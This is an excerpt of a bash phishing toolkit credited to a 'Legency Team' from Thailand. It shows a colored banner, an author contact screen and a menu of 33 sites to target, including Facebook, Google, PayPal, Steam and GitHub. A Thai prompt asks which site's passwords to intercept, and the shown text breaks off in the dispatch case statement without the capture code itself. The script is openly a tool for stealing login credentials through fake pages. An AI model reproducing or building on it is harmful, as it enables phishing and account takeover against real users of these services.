...
${RED} _╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝   ╚═╝   
 ${RED}Version : 1.0
		...
		${GREEN}[${WHITE}-${GREEN}]${CYAN} Make By :Legency Team [ Thailand ]${WHITE}
	EOF
}
...
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}Pxon XI ${RED}[ ${ORANGE}Legency ${RED}]
		${BLUE}FaceBook   ${RED}:  ${CYAN}FaceBook : Pxon XI 
		${BLUE}Discord    ${RED}:  ${CYAN}Legency#9999
...
${RED}[${WHITE}01${RED}] Facebook      ${RED}[${WHITE}11${RED}] Twitch       ${RED}[${WHITE}21${RED}] DeviantArt
	${RED}[${WHITE}02${RED}] Instagram     ${RED}[${WHITE}12${RED}] Pinterest    ${RED}[${WHITE}22${RED}] Badoo
		${RED}[${WHITE}03${RED}] Google        ${RED}[${WHITE}13${RED}] Snapchat     ${RED}[${WHITE}23${RED}] Origin
	${RED}[${WHITE}04${RED}] Microsoft     ${RED}[${WHITE}14${RED}] Linkedin     ${RED}[${WHITE}24${RED}] DropBox	
		${RED}[${WHITE}05${RED}] Netflix       ${RED}[${WHITE}15${RED}] Ebay         ${RED}[${WHITE}25${RED}] Yahoo		
	${RED}[${WHITE}06${RED}] Paypal        ${RED}[${WHITE}16${RED}] Quora        ${RED}[${WHITE}26${RED}] Wordpress
		${RED}[${WHITE}07${RED}] Steam         ${RED}[${WHITE}17${RED}] Protonmail   ${RED}[${WHITE}27${RED}] Yandex			
	${RED}[${WHITE}08${RED}] Twitter       ${RED}[${WHITE}18${RED}] Spotify      ${RED}[${WHITE}28${RED}] StackoverFlow
		${RED}[${WHITE}09${RED}] Playstation   ${RED}[${WHITE}19${RED}] Reddit       ${RED}[${WHITE}29${RED}] Vk
	${RED}[${WHITE}10${RED}] Tiktok        ${RED}[${WHITE}20${RED}] Adobe        ${RED}[${WHITE}30${RED}] XBOX
		${RED}[${WHITE}31${RED}] Mediafire     ${RED}[${WHITE}32${RED}] Gitlab       ${RED}[${WHITE}33${RED}]Github

		${GREEN}ข้อมูลผู้สร้าง ${RED}[${WHITE}99${RED}] ${GREEN}ออก ${RED}[${WHITE}00${RED}]

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} เลือกเมนู ที่จะ ดักรหัสผ่าน : ${RED}"
	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
